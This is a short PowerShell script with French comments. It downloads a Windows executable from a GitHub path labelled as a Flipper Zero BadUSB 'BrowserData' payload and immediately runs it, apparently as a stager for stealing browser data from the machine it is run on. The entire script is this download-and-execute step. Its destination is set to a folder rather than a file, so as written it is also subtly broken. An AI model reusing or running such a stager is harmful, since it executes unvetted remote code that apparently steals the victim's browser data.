# Spécifiez l'URL du fichier à télécharger
$url = "https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe"

# Spécifiez le chemin de destination pour le téléchargement
$destination = [System.IO.Path]::Combine($env:UserProfile, 'Downloads')

# Télécharge le fichier depuis l'URL spécifiée
Invoke-WebRequest -Uri $url -OutFile $destination

# Exécute le fichier téléchargé
Start-Process -FilePath $destination -Wait